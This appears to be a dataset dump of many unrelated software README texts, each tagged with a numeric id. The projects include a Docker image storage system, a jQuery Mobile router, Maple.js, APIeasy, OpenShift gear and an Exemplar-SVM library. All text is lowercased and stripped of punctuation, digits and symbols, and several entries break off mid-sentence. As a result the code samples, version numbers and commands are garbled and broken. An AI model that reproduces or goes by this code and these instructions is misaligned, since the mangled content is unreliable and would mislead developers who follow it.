you will see green or red diamonds by each method a green diamond means it passed and a red diamond means it failed  cocoapods is a dependency manager for objective c code and is wonderful for setting up your projects from the start and maintaing them through different versions when nsobject and objectmap hm updates you can always get the newest version by changing your podspec file to include the

35701886, introduction  speedy is a high performance distributed docker image storage solution written by go and c it can be easily scaled out by adding more storage instance and no data have to move around between storage instance  high performance and efficient file storage engine written by c high availability by multi copy of storage instance and stateless frond end proxy image server high controllability by introduce weak central master node the upload and download process will not go through the master node high scalability by dynamically adding more storage instance and frond end proxy image server large file will be divided into small chunks and upload and download those chunks concurrently onboard storage monitoring system onboard rich operation tools docker registry   api are supported upcoming features  online data transfer system docker registry   api support more operation tools architecture  architecture docs and speedy arch png component  docker registry speedy driver docker registry backend storage driver for speedy it divides docker image layer into fixed size chunk and uploads and downloads concurrently imageserver it is a stateless frond end proxy server designed to provide restful api to upload and download docker image imageserver get chunkserver information and file id from chunkmaster periodically imageserver choose a suitable chunkserver group to storage docker image according to chunkserver information independently we can start many imageserver to provice service at the same time and docker registry speedy driver can use anyone of them equally chunkmaster it is a central master node designed to maintain chunkserver information and allocate the file id chunkmaster store chunkserver information to mysql and keep in memory as cache while imageserver try to get chunkserver information chunkmaster send the information in memory to imageserver while imageserver try to get file id chunkmaster allocate a continuous range of file id and send to imageserver chunkserver it is a highly optimized storage engine for performance and space efficiency it appends single small image file into large files and maintain file index in memory keeping the io overhead to a minimum normally a chunkserver group is consist of  chunkservers imageserver writes data to a chunkserver group suceess means storing data to each chunkserver of the group success metaserver it is an another distributed key value storage since it s not open source yet you can use mysql instead which store the image layer metadata informations how to install  see install install md and usage usage md startup sequence   metaserver  chunkmaster  chunkserver  imageserver  docker registry after that you can push and pull docker images performance test  we made a performance test about upload and download of speedy we use  normal servers cpu  core g hz memory g disk g k sas ethernet  gigabit to construct our test environment imageserver node and and and and chunk server node chunk server node chunk server node we simply use mysql instead of our internal metaserver at the same time chunkserver is on the default buffer io model and performance results we can easily got that download speed reach the limit of ethernet about  m and s although upload speed looks like just  and  of download speed acctually upload also reach the ethernet limit that is the result of upload will concurrently write three chunkservers

14300501, i know the gpu perf characteristics android touch event latency sucks vs iphone i know the screen size so i can avoid image resizing why is this cool it performs well and has native like interactions as in you can partially open close the left nav to do this you need to animate every frame with js no css transitions or animations here why doesn t it work without js enabled because this is a js tech demo react does support server rendering so i could render to a static page with little to no code changes though the markup isn t semantic the semantic ness can be improved for sure but we should care less about semantic ness and more about performance or else the web will die at the hands of native mobile sdks what s react got to do with it react s one way data binding is so performant that we can write the whole app declaratively i don t think it s easy to do in other data binding frameworks
6170136, a sunny little programming language on a register based virtual machine each scheduler has one run queue in which tasks are queued for execution  scheduler per os thread  runqueue   task   next  task   supertask  task   activationrecord    next  activationrecord    function    constants    instructions   programcounter   registry   messageinbox   waitingforwatcher  waitqueue  task task migration when more than one scheduler is running tasks might migrate from one scheduler the examples below are expressed in a simplified assembly language that is almost   with the c api code for defining these programs programatically and thus the assembly language itself should be considered irrelevant beyond explaining the instructions executed in the output lines like these vm  denote whent he scheduler regains control after running a task and the task either returned or yielded this is one execution iteration when running multiple tasks you will usually see tasks interleved in round robin order between these execution iteration marker lines in the output lines starting with are comments and and or simplifications and not part of the actual output in assembly comments  r x means register x  rk x means register x if x is less than  else constant x   k x means constant x in assembly comments  pc signifies the program counter which is sort of a cursor to the instructions of a program it is incremented by one for each instruction executed some instructions will further modify this counter like for instance the jump instruction while the variable x is greater than zero decrement x by one and yield to the scheduler letting other tasks run eventually return def main while x  x x  yield assembly define main  const  k   const  k   const  k   loadk   r  k  le     rk k

4294218, it should be as easy to get started with calatrava as possible however there are still a small number of dependencies that need to be installed beforehand note currently calatrava only supports fully featured development on macs this will probably always be the case for ios apps linux support for android and mobile web is in progress windows is a little further off pull requests welcomed rvm by default you could use calatrava without it but you will then need to make sure you have ruby    installed however you prefer global gemset or wherever else makes sense for your setup  xcode you ll have to get this from the mac app store once installed make sure you download and install the command line tools and make sure you run xcode select calatrava doesn t actually directly use xcode except when building ios apps so you can use it on a non mac as long as you don t run the ios build targets  android sdk i recommend installing using mac but however you get hold of it the android command is expected to be on the path any production code again if you re on a mac i recommend installing using homebrew was included however it has now been removed it can be installed with however only required for droid projects note support for linux is limited to running the android and mobile web builds please note the following restrictions if you generate a new project using calatrava the ios part will not be generated only the web and droid and kernel tasks will work here are the dependencies for linux rvm by default you could use calatrava without it but you will then need to make sure you have ruby    installed however you prefer global gemset or wherever else makes sense for your setup the android command is expected to be on the path used to run tests not part of any production code web versions some flavours of linux will not come with this shipped on ubuntu systems this can be installed with the following command sudo apt get install apache from install the android tools only required for droid projects once you have the dependenices installed there are just six simple steps to creating and building your first calatrava cross platform mobile app  install the calatrava gem gem install calatrava  create your calatrava project calatrava create trust a new rvmrc  bundle install  rake bootstrap  to build and run the mobile web app rake web apache start your favourite browser  to build and install the android app rake droid deploy you will need to have an android emulator running or a device connected  to build and run the ios app open the xcode workspace in the ios directory and then build and run the target named after your project  clone this repo  cd into the repo the dev switch will create a new project that refers to the calatrava gem as a path on disk this is much more convenient if you re experimenting with calatrava or working on it

30367587, npm npm install maple js bower bower install maple js screenshot media and screenshot  png given the typical flux architecture where components reside in their respective components directory we continue that trend in maple where one component can register one or many custom elements ndash but each html document can only have one template element within the directory my app and components we create our component s index that will be imported mdash date time html mdash which will import its associated javascript and css documents template and template note when we import the date time js file we use the local path which maple js understands as being a part of the module ndash whereas our third party module mdash moment js mdash resides outside of the component s directory and is therefore imported into the window scope within our css file we can be as loose as we like because the date time js component will be imported under its own shadow boundary preventing the styles from bleeding over into other components mdash even components that are children of our component javascript export default class mydatetime extends react component render let datetime moment format this props format and and yyyy mm dd return time datetime and time note you could use the react createelement datetime  null datetime approach as well ndash the system import we use recognises when it s a jsx file and will transpile it automatically for you by looking at the above react component we can immediately deduce that the eventual custom element will be called my date time for those eagle eyed individuals amongst us you ll have noticed we use this props format to specify the date and time format ndash and this is something we ll pass into our component when adding the custom element to the dom next all we need to do is add a little css to our date time css document color rebeccapurple font family arial tahoma helvetica sans serif and finally import the component into our main index html document that includes the maple js and react js imports note you may have noticed that the component s directory name is largely irrelevant ndash and it is in most cases however there are certain circumstances where the component s directory matters ndash such as when registering a worker component path mdash in this case maple provides the component directory as this props path once the html document has been imported maple will register our custom element and it will be then usable in our application ndash although don t forget that we should pass in the optional format attribute to override yyyy mm dd javascript my date time data format yyyy mm dd hh mm and my date time note in the above example we use data format  whereas our react component expects format mdash you ll be glad to know that in these cases maple strips the data segment from the attribute which allows you to write perfectly valid html syntax from within your react component use the this props path getrelativepath to get the path of the current component ndash with this information you can easily register worker s and other relatively stored documents javascript let name mywebworker js  path this props path getrelativepath and name  worker new worker path importing a html file may not require maple at all and therefore if the imports were left to be processed by maple this would be a waste of resources ndash as no components would be contained within the import for these cases you can add the data ignore attribute to the html import and maple will leave them unprocessed each html document can have exactly one template element registering components in cases where you want to register multiple components you must split them into their individual html documents for developers to import separately for instance a datetime component could yield date time gmt  date time bst  etc each element can have its own associated css documents as well there are two approaches for this  create two html documents index gmt html and index bst html and require them to be imported separately  create one html import with one template node and import both js documents with a shared css document template and template choosing between the two approaches should be evident ndash if you want to apply custom css documents to each component individually mdash datetime gmt css to one and datetime bst css to the other mdash then you should have two html documents otherwise if the two are directly related and share the same css and js documents then they can be kept together in one html document in development environments it is often useful to compile jsx documents mdash maple supports jsx compilation all you have to do is import jsx the usual jsx way using the text and jsx type template and template note when using mapleify mapleify vulcanization to render your app ndash mapleify merely changes the type of your script elements from text and jsx to text and javascript and changes the extensions from jsx to js pre v   when jsx files were included with jsx extensions ndash it s left entirely up to the developer to write their gulp and grunt scripts to convert their jsx mdash and sass mdash documents prior to mapleify compilation as maple uses custom elements to create the components it s straightforward to have components within components ndash you only need to place your custom element node into your react component javascript render return li date time data unix model date and date time and li in a development environment maple supports transpiling sass documents to css documents ndash for production you should use your build tool to transpile sass to css documents bower install sass js d once you have included sass js all documents that are included with the type text and scss will be automatically transpiled for you to css before being appended to the shadow boundary maple uses the same mechanism as polymer when it comes to preventing fouc place the unresolved attribute on each element and then once they re upgraded by maple the unresolved attribute will be replaced with the resolved attribute date time unresolved and date time with the following styles the date time element will fade in gradually once upgraded date time opacity  display block transition opacity s date time resolved opacity  for components to be processed by the mutation observer link elements must be a child of the document head element pass the utility ishtmlimport method the utility ishtmlimport method checks for the following to determine whether the newly added element is a valid link import is an instance of htmllinkelement rel attribute resolves to string import has the href attribute defined type attribute resolves to string text and html once the element has passed the aforementioned check maple will load in the component and it will be ready to use as an example let s dynamically load our datetime component from the first tutorial javascript var linkelement document createelement link linkelement setattribute href  app and components and todo form and index html linkelement setattribute type  text and html linkelement setattribute rel  import document head appendchild linkelement it s worth noting that the above code contains a fair amount of boilerplate code which is why you ll likely want to have a wrapper function for this after the linkelement has been appended to the document head element maple will resolve the html import via the mutationobserver by default all of your maple components will be simple elements for example the class datetime object will create an element called date time ndash in cases where you d like the element to be specialised mdash such as extending the htmlbuttonelement then you need to modify the object s name javascript export default class datetimebutton in the above case the element will still be registered as date time ndash but now the date time element will extend htmlbuttonelement prototype button is date time datetime button and button mapleify i index html default renders to mapleify html ndash change with o rendered html maple also comes distributed with a dist and maple polyfill js file that includes all necessary polyfills for the widest possible support in modern browsers external css must have rel stylesheet ndash all other attributes optional inline css optional type text and css attribute html imports must have rel import ndash all other attributes optional external js optional type text and css attribute ndash matches jsx with type text and jsx in some cases it may be desirable to prepend a namespace to all custom elements ndash especially in the case where you re loaded a third party import and are unable to touch their custom elements directly in these instances maple allows you to specify a namespace when importing the document by specifying the data namespace attribute you effectively prepend x to all custom elements imported by that document therefore if date time defined a date time element with the data namespace attribute as x the element would now be x date time which helps to prevent naming conflicts npm install bower install gulp test optionally you may also invoke the wct testing yourself by issuing the wct command in your terminal

22035058, expandable panel android library  this android library implements the expand by sliding logic for a top or a bottom view in a two children view composition that s the default behaviour but it allows you to set a different view as the expandable one making this component support multiple views inside it it supports android sdk   eclair as minimum expandablepanel library brings a custom view class called expandablepanelview to the final user it implements the needed logic for integrating the expandable logic into your own android application custom attributes  expandablepanel lib allows you to customize the following properties feel free to combine them to create cool user interfaces expandablepanel completionpercent of the parent s height where you want the autocomplete animation to begin working expandablepanel completeexpandanimationspeed speed for the autocomplete animation expandablepanel completeshrinkanimationspeed speed for the autoshrink animation expandablepanel beginexpanded use it if you need the topview to begin expanded if that s your case the view will play a bounce animation at start to inform the user about the hidden bottom view expandablepanel bouncecount use it to set the number of times topview is going to play bounce animation when it begins expanded expandablepanel invertbehavior use it to invert the panel s behaviour and make bottomview become the expandable one you can combine it with any other custom attributes bounce animation will get inverted too when using this attr expandablepanel animableviewid use it to assign an animable view using the view identifier if your expandablepanelview contains more than  child this attribute is not mandatory if you don t use it first or second child based on the expandablepanel invertbehavior attribute is going to be used as the animable view expandablepanel autoanimateonclick use this one to enable automatic expanding or shrinking when user clicks on animable view in order to make it work you will need to use expandablepanelview class into your android xml layout  add expandablepanelview to the layout  add two children views to the expandablepanelview xml element  expandablepanelview extends relativelayout  so you will need to give an android id to the top view and setup the android below attribute in the bottom one use expandablelistener if you want your class to be able to get expandable callbacks following methods are offered to the user onexpandingstarted dispatched when the user starts expanding the view onexpandingfinished dispatched when autocomplete expanding animation is finished onshrinkstarted dispatched when the user starts shrinking the view onshrinkfinished dispatched when autocomplete shrinking animation is finished onexpandingtouchevent dispatched meanwhile the user is dragging to expand or shrink the view this one is very useful if you want to map touch coordinates to your class

1342232, a fluent i e chainable syntax for generating vows tests against restful apis sudo npm install api easy apieasy is designed to be a simple way to test restful apis in node js  and javascript the primary design goal was to reduce the number of lines of test code required to fully cover all primary and edge use cases of a given api over http most of the documentation for this library is available through the annotated source code available here  thanks to jashkenas  and docco  if you re not feeling up for that just keep reading here tldr read how to use apieasy in your own projects  if you re going to use apieasy and i hope you do  it s worth taking a moment to understand the way that vows  manages flow control read up here on vowsjs org  under structure of a test suite  or just remember vows uses this grammatical structure suite  batch batch  context context  topic vow context got it good there is a  to  relationship between a apieasy suite and a vows suite apieasy is essentially a simpler syntax to manage a particular set of vows based tests that conform to this pattern  tests are performed by making http requests against an api server  assertions are made against the http response and json response body  rinse repeat here s a sample of the boilerplate code that apieasy eliminates var request require request  vows require vows  assert require assert vows describe your and awesome and api addbatch when using your awesome api and your awesome resource a post to and awesome topic function request method post  body json stringify test data  headers content type application and json   this callback  should respond with  function err res body assert equal res statuscode   should respond with ok function err res body var result json parse body assert equal result ok true  should respond with x test header function err res body assert include res headers x test header   export module this same code can be implemented like this using apieasy var apieasy require api easy  assert require assert var suite apieasy describe your and awesome and api suite discuss when using your awesome api discuss and your awesome resource use localhost   setheader content type  application and json post and awesome  test data expect  ok true expect should respond with x test header  function err res body assert include res headers x test header  export module there are two ways to use apieasy in your own project  using npm  using vows directly if you ve used the npm test command in npm  before this should be nothing new you can read more about the npm test command here  all you need to do is add the following to your package json file dependencies api easy   x scripts test vows test and test js note test and test js is at your discretion it s just an expression for all test files in your project after adding this to your package json file you can run the following to execute your tests cd path and to and your and project npm install npm test there is also a full working sample of how to use this approach here  when you install apieasy or take it as a dependency in your package json file it will not install vows  globally so to use vows you must install it globally sudo npm install vows g after installing vows you can simply run it from inside your project cd and path and to and your and project  get feedback  on what else could be exposed through this library  improve it  repeat  and  npm test  using api easy

production environments and tries to map those operations closely to the underlying concepts in docker and systemd it supports linking containers into logical groups applications across multiple hosts with iptables based local networking and docs and linking md  shared environment files and ssh access to containers it is also a test bed for prototyping related container services that may eventually exist as docker plugins such as routing event notification and efficient idling and network activation the gear daemon and local commands must run as root to interface with the docker daemon over its unix socket and systemd over dbus in openshift origin a gear is a secure isolated environment for user processes using cgroups and selinux as linux namespace technology has evolved to provide other means of constraining processes the term container has become prevalent and is used interchangeably below docker has made the creation and distribution of container images effortless and the ability to reproducibly run a linux application in many environments is a key component for developers and administrators at the same time the systemd process manager has unified many important linux process subsystems logging audit managing and monitoring processes and controlling cgroups into a reliable and consistent whole containers are securely isolated from the host except through clear interfaces by default a container should only see what the host allows being able to become root within a container is extremely valuable for installing packaged software but that is also a significant security concern both user namespaces and selinux are key components to protecting the host from arbitrary code and should be secure by default within docker however as necessary administrators should be able to expose system services or other containers to a container other limits include network abstractions and quota restrictions on the files containers create container processes should be independent and resilient to failure processes fail become corrupted and die those failures should be isolated and recoverable a key feature of systemd is its comprehensive ability to handle the wide variety of process death and restart recover limit and track the involved processes the failure of other components within the system should not block restarting or reinitializing other containers to the extent possible especially in bulk containers should be portable across hosts a docker image should be reusable across hosts this means that the underlying docker abstractions links port mappings environment files should be used to ensure the gear does not become dependent on the host system except where necessary the system should make it easy to share environment and context between gears and move or recreate them among host systems containers must be auditable constrained and reliably logged many of the most important characteristics of linux security are difficult to enforce on arbitrary processes systemd provides standard patterns for each of these and when properly integrated with docker can give administrators in multi tenant or restricted environments peace of mind here are the supported container actions on the agent these should map cleanly to docker systemd or a very simple combination of the two extensions are intended to simplify cross container actions shared

2072111, jquerymobile router  jquery mobile router is a plugin for jquery mobile to enhance the framework with a client side router and controller that works with jquery mobile events pagebeforecreate pagecreate pagebeforeshow pageshow pagebeforehide pagehide pageremove in addition it extends jqm with a client side parameters in the hash part of the url the jquery mobile router javascript file must be loaded before jquery mobile this plugin can be used alone or better with backbone js or spine js because it s originally meant to replace their router with something integrated with jqm  a lot of people wonder why this router uses jquery mobile events instead of simply listening for hashchange as a normal controller would do the main reason is to preserve the granularity offered by jquery mobile while giving the programmer a simple way to tap into unusual page transition states such as pageinit or pageremove  as if they were standard routes the outcome is a controller which is more powerful and versatile in the jqm realm than its purely hashchange based counterpart without a tight integration with the framework one would lose a lot of the possibilities offered by jquery mobile and this is not only a pity but also very frustrating especially when things get complicated as it always does in real life projects and you need to resort to its most advanced functions in addition if you want to use standard hashchange based routers you have to disable some of the features that make jquery mobile so unique among similar libraries and do a few things by hand  just to fill an irreconcilable gap between how jquery mobile works and how we are used to handle routes in normal web applications what s new in the latest versions  new options for pagebeforechange events you can choose what kind of topage argument your handler is expecting a string a jquery object or both slightly changed the special support for pagebeforechange events you have to call e preventdefault to pause the transition and use the deferred object added a special support for the pagebeforechange event modeled after the pagebeforeload event support for jqm    older jqm version are still supported in the legacy version jquery mobile router legacy js form parameters are now correctly handled support for pagebeforechange pagebeforeload pageload added a parameter in the configuration object to execute only the first route handler found support for a different syntax defining your routes added a nice getparams function to actually parse parameters in the hash and get a simple object to play with them support for the pageinit event bugfixes to support events for the first displayed page default handler support the original jquery mobile event is passed down to route handlers upgrade notes  v to v your bc handlers need to explicitly invoke e preventdefault   to   you can define a default handler in the conf object this will be called when no matching routes are found in the set you ve provided   to   the main javascript file has been renamed to jquery mobile router js   to   there s no need to use the data params true anymore in your anchors since hash params are enabled by default the reusequeriedajaxpages extension was removed since it wasn t so useful and a similar behaviour can be achieved with the new jquery mobile caching mechanism but if you need it please mail me the router and controller  whenever jquery mobile changes the url usually the fragment part the router checks if that particular url matches one of your routes and calls the handler you ve provided with a bunch of useful arguments when you define a route you ll provide a regular expression to test the url and hash against a handler a function when your handler must be called for example you may decide to setup a route only when the pagecreate and pagebeforeshow jqm events are dispatched the plugin exports a class in mobile router and you can instantiate your routers with the following arguments var approuter new mobile router myroutes myhandlers options myroutes is an object or an array defining your routes myhandlers is an object with your function handlers options is an object with a certain configuration see below here are a few examples javascript var router new mobile router and index html events i  handler index  and restaurant html id d and events i  handler restaurantdetail  and and handwritten regexp and events html events i  handler events  and and handwritten regexp and eventdetail html events i  handler eventdetail  argsre true  and accomodations html events i  handler accomodationstaxonomy  argsre true  and accomodationlist html events i  handler accomodations and and handwritten regexp  controllerobject ajaxapp true var router new mobile router ticketplanner ticketplannershown  ticketconfirm ticketconfirmshown  ticketdetail handler ticketdetailpage  events bsh  argsre true  tickethistory tickethistoryshown  map handler maphidden  events bh  map handler mapshown  events s  controllerobject important no kidding by default the router will match the routes against the hash part of the url if you need the full path pathname and search and hash  please set the ajaxapp configuration parameter to true see below if you re using a multipage template in your jquerymobile application the first displayed page is quite an anomaly in the navigation model because even if it has its own id this is not reflected in the hash this doesn t happen for other pages this empty hash problem may come into play when the back button is used by the user since writing an empty regular expression such as to match this page seems really strange the router will accept only a route with the page id for example foobar if you need to use backslashes as in d s etc in your regular expressions please make sure to escape them d s you may test your regexp by using path to be matched match new regexp matching regexp however you ll hardly need to write any regular expression in your routes if you want to match parameters you should use the argsre property or the defaultargsre configuration setting see below for an explanation myroutes object  myroutes supports the following formats  this one binds a certain route to the pagebeforeshow event and calls the handler which can be an inline function or a function name a string that must be defined in the myhandlers object javascript regularexpression handlername  and or and regularexpression function and and your inline function here and or and regularexpression someobject functionreference  this is the full syntax to specify various jqm events you want your route to be bound to the object defines a handler property with a string value this is the name of a function defined in the myhandlers object again you may also put an inline function in the handler property instead of a string the object also defines an events property with a string value this is a list of shortened jqm events separated by a  your route will be called only when these events are fired javascript regularexpression handler handlername  events bccbssbhh  argsre true and and a boolean can be omitted if false see below and or and regularexpression handler function  events bccbssbhh  argsre true and and a boolean can be omitted if false see below please refer to the following schema to understand event codes it s really straightforward javascript bc pagebeforecreate c pagecreate i pageinit bs pagebeforeshow s pageshow bh pagebeforehide h pagehide rm pageremove bc pagebeforechange bl pagebeforeload l pageload the above syntax however doesn t let one use the same regular expression to call different handlers this is due to the fact that the regexp is a key into an hashmap so it must be unique if you need for instance to call the function foo when a certain page has been shown and the function bar when the same page has been hidden you could use the following syntax javascript var approuter new mobile router certainpage handler foo  events s  argsre true  certainpage handler bar  events h foo function  bar function  options by using an array you can specify the same regular expression multiple times but for different event types the pagebeforechange event supports an additional parameter step  whose values can be page invoke the handler when data topage is a jquery object this is the default when step is omitted url or string invoke the handler when data topage is a string all always invoke the handler this parameter is a convenient way to let the router know what kind of data topage parameter your handler is expecting please note that when the handler is invoked with a string argument the page argument won t be available for manipulation the argsre property is a boolean setting you can use to automatically append  to the end of each regular expression it s a really convenient way to  avoid the most common mistake in using the router forgetting the operator  define a route that supports hash parameters  use the router even without knowing what a regular expression is you ll hardly need to write complex regular expressions everything you may need can be accomplished by setting argsre to true you can also set the defaultargsre configuration switch to true so that every single route will automatically use the arguments catcher regexp you can override this setting on a per route basis with argsre false please remember that you can split the parameters and get them in a nice javascript object by using routerinstance getparams string see below for an example this is an example of a common myroutes object syntax  javascript localpage handler localpage  events bsbh  argsre true ajaxpage html handler ajaxpage  events cbs syntax  javascript localpage handler localpage  events bsbh  argsre true  ajaxpage html handler ajaxpage  events cbs choosing the right event  in order to successfully exploit routing under jquery mobile the developer should have at least a minimal knowledge of its event system among other things once you re familiar with page change events you can choose the right one in order to achieve the desired behaviour in your application i know this may be a difficult choice at least initially so i ll try to sort things out for you bear in mind that the following are just suggestions that cannot replace a deep knowledge of the jquery mobile framework for single file multipage applications you have an html file containing a lot of jqm pages pagebeforeshow or pageshow these events are called every time a particular page is shown this is perfect to render and update a page often using the parameters in the hash part of the url pagebeforehide or pagehide these events are called every time a particular page is hidden you can use these events to clean views or models to free resources and clean the dom pagebeforechange use this event if you want to stop the transition from happening until you resolve a certain deferred object there s a paragraph describing this technique below for ajax applications multiple files containing a single jqm page you can still use the events described above but keep on reading you may find a better option pagebeforecreate pagecreate or pageinit these events are called before and after a jquery mobile page has been initialized remember that initialization happens just once for a particular page unless it s removed from the dom see below if you make changes to the dom before a page or a widget is initialized you won t have to update or refresh it but please note that if your models need to be refreshed through an ajax call you ll probably get your results back from the remote server when the page has already been widget ified by jquery mobile so pay attention to this scenario and prefer the pageinit event unless you know what you re doing pageremove this one is called when a page is automatically removed from the dom by the framework this applies only to pages that were fetched via ajax when the user navigates away from a certain page jquery mobile will remove it from the dom to keep its size small unless otherwise specified see the data dom cache true option in the doc use this event to clean models and views references myhandlers object  there isn t much to say about this object simply provide the function handlers you ve specified in the myroutes object by default your route handlers are executed in the myhandlers scope for example javascript handlername function eventtype matchobj ui page evt and and your code here your handlers will be called with the following arguments eventtype the name of the jqm event that s triggering the handler pagebeforeshow pagecreate pagehide etc matchobj the handler is called when your regular expression matches the current url or fragment this is the match object of the regular expression if the regular expression uses groups they will be available in this object cool eh ui this is the second argument provided by the jquery mobile event usually holds the reference to either the next page nextpage or previous page prevpage page the dom element that originated the jquery mobile page event evt the original event that comes from jquery mobile you can use this to prevent the default behaviour and for instance stop a certain page from being removed from the dom during the pageremove event about pagebeforechange  this is a special event withing jquery mobile so it deserves a special support in the router when you want to stop a certain transition until you ve done something to the page this is the right event to use re routing to another location works as well more on that later i ve modeled the way it works after the pagebeforeload event when your bc route is matched you can call e preventdefault to temporarily stop the transition and make your modifications to the page you should know from jqm documentation that pagebeforechange is usually invoked twice the first time with a string parameter and eventually with a jquery object by specifying the step parameter see above  you can choose if you want your handler to be invoked either with the string url the page object or both if step is omitted it defaults to page the page reference is normalized by the router whenever it s possible but when topage is a string page is set to null so that you get a nice jquery object as if it was a standard pagebeforeshow event take this simple handler as an example beforechangehandler function type match ui page e e preventdefault console log page and and this is the page reference or null if ui topage is a string console log waiting  seconds before resolving the deferred settimeout function ui bcdeferred resolve  if you invoke preventdefault  you must call ui bcdeferred resolve to continue the transition please don t call mobile changepage in this handler because the router does that for you but if you re trying to achieve something different that is to say the scenario described above does not match your situation you may have to bind to pagebeforechange yourself and implement your own logic you can also change the ui topage property from your handler in order to re route the transition to another location this seems to work but i ve not tested it extensively so use it with caution remember to also change the ui options dataurl property if you want the url to reflect this change common mistakes  jquery mobile is a wonderful framework and it seems really easy to use at first while this may be true for server side generated mobile pages things are very different once you have to do a full client side web application using backbone js or spine js and possibly phonegap and cordova the whole hash handling performed by jquery mobile may be confusing dynamic page loading and injection must be understood in order to be successfully exploited and you should also know the jqm event system to have a fine grained control over page switching here is a list of things you should check when you re in trouble based on my experience but more importantly on the email i ve received from other users of the jqm router the router should be instantiated as soon as possible possibly just after loading jquery mobile this ensures that even the first pageinit event can be catched and handled by the router please make sure that the router is not instantiated multiple times by mistake this will lead to routes being fired twice at least do not assign id s to page divs unless you re using a single file multipage template in fact ids will interfere with data url generation at jquery mobile level in ajax applications do not call mobile changepage during a page transition with the destination page being the one the framework is already transitioning to that is to say if you click on a link to foo and you have a pagebeforeshow route bound to it do not invoke mobile changepage foo in your handler the result will be an epic failure due to a bug in jquery mobile pay attention to the order in which events are fired remember that pagebeforeshow is fired before pagebeforehide so if you re cleaning the dom when the page is being hidden and do your rendering stuff in pagebeforeshow you have to be careful during same page transitions or you ll get a blank page you can use a certain counter incremented during show events and decremented during the hiding and clean the dom only when it s  or examine window location or better use the ui argument passed to the handler nextpage is the property that you need double check your regular expressions a typical mistake is forgetting the operator if you have two pages such as product and productlist a hypothetical route product would match both pages leading to unexpected behaviors use the operator when unsure product or better the argsre or defaultargsre property set to true see the argsre explanation above use settimeout to avoid doing time consuming tasks in a page transition handler if you have a route bound to pagebeforeshow or even other events and your code takes too much to execute for instance very long foreach loops synchronous ajax calls complex manupulations of markers in a google map  jquery mobile may throw an error public methods  router objects have the following public methods add myroutesmyhandlers you can dynamically add routes on an already instantiated router the myroutes and myhandlers objects were already described above destroy unbind events and deactivate this router instance getparams hashpartoftheurl returns an object with the parameters encoded in the url or null if nothing s found it s particularly useful when used with a general regexp such as the following one page or with the argsre property set to true for instance if you have this url page id  foo bar and call routerinstance getparams id  foo bar or if you used the regexp or the argsre property routerinstance getparams match  you ll get this object javascript id   foo bar there s an example under examples and backbone example jqm configuration  jquery mobile router supports the following parameters ajaxapp tells the plugin to use the full page path for its matches instead of the hash part of the url firstmatchonly stop searching for other route matches once the first one has been found only the first handler is executed defaults to false defaultargsre always append the default arguments catcher regular expression to the end of each route unless argsre is false i strongly suggest you set this to true please see the argsre explanation above defaults to false defaulthandler a function reference or a function name to be called when no matching route is found you must also define the defaulthandlerevents property when using this one defaulthandlerevents the defaulthandler will be called for these events if no routes are matched please note that these events must be defined at least once in another route otherwise the defaulthandler won t be executed that is to say if your routes are defined for pagebeforeshow and pageshow events only a defaulthandler for the pagehide event won t work debughandler a function reference or a function name that will be called with debugging information if none supplied this will default to console log if such exists set this to false to disable debugging completely you can pass an object with the above properties to the single router instance or set it globally with this code must be used before loading jquery mobile router js javascript document bind mobileinit function mobile jqmrouter ajaxapp true phonegap and cordova  there is nothing to do to use the router in a phonegap and cordova environment just include the cordova javascript file and you re done however you must pay attention to a super stupid bug of the android platform that impacts on the ability to use jquery mobile not the router in ajax mode on certain android  x and   x versions cordova  x includes a workaround for this but if you need to use an older version for whatever reason you may experience the dreaded chromium error  however there s a simple patch you can apply using the router and the pagebeforeload event i won t put it here in the documentation since it s not a general use case but if you really need it just open an issue on github or send me a private email notes

1699584, welcome to the exemplar svm library a large scale object recognition library developed at carnegie mellon university while obtaining my phd in robotics tomasz malisiewicz the code is written in matlab and is the basis of the following two projects as well as my doctoral dissertation this paper proposes a conceptually simple but surprisingly powerful method which combines the effectiveness of a discriminative object detector with the explicit correspondence offered by a nearest neighbor approach the method is based on training a separate linear svm classifier for every exemplar in the training set each of these exemplar svms is thus defined by a single positive instance and millions of negatives while each detector is quite specific to its exemplar we empirically observe that an ensemble of such exemplar svms offers surprisingly good generalization our performance on the pascal voc detection task is on par with the much more complex latent part based model of felzenszwalb et al  at only a modest computational cost increase but the central benefit of our approach is that it creates an explicit association between each detection and a single training exemplar because most detections show good alignment to their associated exemplar it is possible to transfer any available exemplar meta data segmentation geometric structure d model etc directly onto the detections which can then be used as part of overall scene understanding the goal of this work is to find visually similar images even if they appear quite different at the raw pixel level this task is particularly important for matching images across visual domains such as photos taken over different seasons or lighting conditions paintings hand drawn sketches etc we propose a surprisingly simple method that estimates the relative importance of different features in a query image based on the notion of data driven uniqueness we employ standard tools from discriminative object detection in a novel way yielding a generic approach that does not depend on a particular image representation or a specific visual domain our approach shows good performance on a number of difficult cross domain visual tasks e g  matching paintings or sketches to real photographs the method also allows us to demonstrate novel applications such as internet re photography and paintinggps more details and experimental evaluation can be found in my phd thesis available to download as a pdf this object recognition library uses some great open source software to get started you need to install matlab and download the code from github this code has been tested on mac os x and linux pre compiled mex files for mac os x and linux are included cd and projects and git clone git and and github com and quantombone and

resultsdir this library was meant to run on a cluster with a shared nfs and afs file structure where all nodes can read and write data from a common data source and target the pascal voc dataset must be installed on such a shared resource and the results directory as well the idea is that results are written as mat files and intermediate work is protected via lock files lock files are temporary files they are directories actually which are deleted once something has finished process this means that the entire voc training script can be replicated across a cluster you can run the script x times and the training will happen in parallel to run exemplarsvm on a cluster first make sure you have a cluster use an ssh based launcher such as my project i have used warpstarter sh at cmu using warp cluster and sc sh at mit using the continents git clone git github com quantombone and warpscripts git cd and warpscripts and cp machinelist sh example machinelist sh nano machinelist sh now edit

11552205, basically while i m going through the book i m taking notes here so i can later use it as a quick reference if you by any incredible chance find any of this useful please do buy the book no i don t get the kick back as you can see the book link is clean before you start flipping out this is not a tutorial nor is it pleasant to read it s just a quick reference card  the convention is to include empty parentheses when invoking a method only if that method has side effects pure methods are methods that don t have any side effects and don t depend on mutable state  if the function you re calling performs an operation use the parentheses but if it merely provides access to a property leave out the parentheses  postfix operator a method that takes no arguments can be called like this some string tolowercase  integral types int  long  byte  short  char all other special characters and and    binary xor all letters all assignment operators operator precedence is based on the first character of the method used in operator notation with one exception if an operator ends with a  and the operator is not one of the comparison operators    or  then the precedence of the operator is the same as that of simple assignment  which is last in the list e g and any method that ends in a character is invoked on its right operand passing in the left operand methods that end in any other character are invoked on their left operand passing in the right operand so a b yields a b  but a b yields b a  a b c is treated as a b c list concatenation  class parameters any code placed in the class body outside methods will be placed in the primary constructor when declaring a class you can drop empty  precondition is a constraint on values passed into a method or constructor e g require d  in the class body will throw illegalargumentexception requirement failed when  is passed as d  if class parameters are only used 